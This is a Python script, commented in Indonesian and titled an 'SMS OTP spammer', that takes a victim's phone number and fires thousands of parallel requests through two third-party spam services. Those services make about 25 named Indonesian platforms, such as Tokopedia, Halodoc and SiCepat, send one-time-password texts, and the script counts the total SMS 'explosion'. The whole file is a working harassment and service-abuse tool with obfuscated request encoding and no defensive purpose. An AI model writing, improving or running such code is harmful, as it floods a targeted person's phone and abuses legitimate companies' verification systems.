import asyncio
import aiohttp
import base64
import hashlib
import json
import sys
from datetime import datetime

# ─── KONFIGURASI ─────────────────────────────────────────────
SHS_CONFIG = {
    'url': 'https://www.shs-official.my.id/api/tools',
    'headers': {
        'Content-Type': 'application/json',
        'X-Ghost-Auth': 'WORM-V5-SECURE-CONNECT',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    },
    'timeout': 3,
}

FLOX_CONFIG = {
    'url': 'https://flox-spamotp.vercel.app/api/index',
    'headers': {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Android 16; Mobile; rv:158.0) Gecko/158.0 Firefox/158.0',
        'Referer': 'https://flox-spamotp.vercel.app/',
        'Origin': 'https://flox-spamotp.vercel.app',
    },
    'timeout': 10,
}

# ─── PLATFORM LIST SHS (25 ASLI) ────────────────────────────
PLATFORMS = [
    'internetrakyat', 'matahari_register', 'matahari_reactivation',
    'bonusbelanja', 'alodokter_post', 'alodokter_get', 'dokterin',
    'maulagi', 'bunda', 'sicepat', 'fastwork', 'paper', 'pinhome',
    'beautyhaul', 'bliblitiket', 'rumah123', 'saturdays', 'gritero',
    'adiraku', 'tokopedia', 'planetban', 'duniagames',
    'halodoc_validate', 'halodoc_otp', 'majoo'
]

# ─── ENKRIPSI & SIGNATURE (SHS) ─────────────────────────────
def hard_enc(obj):
    s = base64.b64encode(json.dumps(obj).encode()).decode()
    s = s[::-1]
    return base64.b64encode(s.encode()).decode()

def generate_signature(ts):
    msg = ts + 'WORM-V5-SECRET-KEY-9876'
    return hashlib.sha256(msg.encode()).hexdigest()

# ─── SHS: KIRIM SATU REQUEST ────────────────────────────────
async def shs_send(session, phone, platform, is_first):
    ts = str(int(datetime.now().timestamp() * 1000))
    sig = generate_signature(ts)
    payload = {
        'e': hard_enc({
            'type': 'otp',
            'phone': phone,
            'platform': platform,
            'isFirst': is_first
        })
    }
    headers = SHS_CONFIG['headers'].copy()
    headers['X-Ghost-Time'] = ts
    headers['X-Ghost-Sig'] = sig
    try:
        async with session.post(
            SHS_CONFIG['url'], json=payload, headers=headers,
            timeout=aiohttp.ClientTimeout(total=SHS_CONFIG['timeout'])
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data.get('success', False)
            return False
    except:
        return False

# ─── FLOX: KIRIM SATU REQUEST (32 PLATFORM SEKALIGUS) ───────
async def flox_send(session, phone):
    payload = {'action': 'request_otp', 'phone': phone}
    try:
        async with session.post(
            FLOX_CONFIG['url'], json=payload, headers=FLOX_CONFIG['headers'],
            timeout=aiohttp.ClientTimeout(total=FLOX_CONFIG['timeout'])
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data.get('success', False)
            return False
    except:
        return False

# ─── BATCH GABUNGAN ─────────────────────────────────────────
async def send_hybrid_batch(session, phone, shs_count, flox_count, is_first):
    """Kirim shs_count request ke SHS + flox_count request ke Flox, paralel."""
    shs_platforms = [PLATFORMS[i % len(PLATFORMS)] for i in range(shs_count)]
    tasks = [shs_send(session, phone, p, is_first) for p in shs_platforms]
    tasks += [flox_send(session, phone) for _ in range(flox_count)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    shs_ok = flox_ok = 0
    shs_total = len(shs_platforms)
    for idx, res in enumerate(results):
        if isinstance(res, Exception):
            continue
        if res is True:
            if idx < shs_total:
                shs_ok += 1
            else:
                flox_ok += 1

    shs_fail = shs_total - shs_ok
    flox_fail = flox_count - flox_ok
    return shs_ok, shs_fail, flox_ok, flox_fail

# ─── MAIN ───────────────────────────────────────────────────
async def main():
    print('\n=== SHS + FLOX HYBRID SPAMMER ===\n')
    phone = input('📱 Nomor target (contoh: 085708557587): ').strip()
    if not phone:
        print('❌ Kosong!')
        return

    total = input('🔢 Total batch (default 1000): ').strip()
    total = int(total) if total else 1000

    shs_count = input('⚡ SHS per batch (default 25 = 1 putaran platform): ').strip()
    shs_count = int(shs_count) if shs_count else 25

    flox_count = input('🚀 Flox per batch (default 10 = 320 SMS): ').strip()
    flox_count = int(flox_count) if flox_count else 10

    print(f'\n🚀 Target       : {phone}')
    print(f'📤 Total batch  : {total}')
    print(f'⚡ SHS/batch    : {shs_count} request ({shs_count} platform)')
    print(f'🚀 Flox/batch   : {flox_count} request ({flox_count * 32} platform)')
    print(f'💥 Total ledakan: {total * (shs_count + flox_count * 32):,} platform hit\n')

    shs_ok = shs_fail = flox_ok = flox_fail = 0
    sent = 0
    start = datetime.now()

    connector = aiohttp.TCPConnector(limit=500, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while sent < total:
            is_first = (sent == 0)
            s_ok, s_fail, f_ok, f_fail = await send_hybrid_batch(
                session, phone, shs_count, flox_count, is_first
            )
            shs_ok += s_ok
            shs_fail += s_fail
            flox_ok += f_ok
            flox_fail += f_fail
            sent += 1
            ts = datetime.now().strftime('%H:%M:%S')
            print(
                f'📊 [{ts}] Batch {sent}/{total} | '
                f'SHS ✅{s_ok} ❌{s_fail} | '
                f'FLOX ✅{f_ok} ❌{f_fail} | '
                f'Total SMS: {(shs_ok + flox_ok * 32):,}'
            )

    elapsed = (datetime.now() - start).total_seconds()
    total_sms = shs_ok + (flox_ok * 32)
    print(f'\n✅ Selesai dalam {elapsed:.1f}s')
    print(f'📊 SHS    : ✅ {shs_ok} | ❌ {shs_fail}')
    print(f'📊 FLOX   : ✅ {flox_ok} | ❌ {flox_fail} (x32 platform)')
    print(f'💥 TOTAL SMS OTP TERKIRIM: {total_sms:,}')

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('\n❌ Dibatalkan oleh user.')
        sys.exit(0)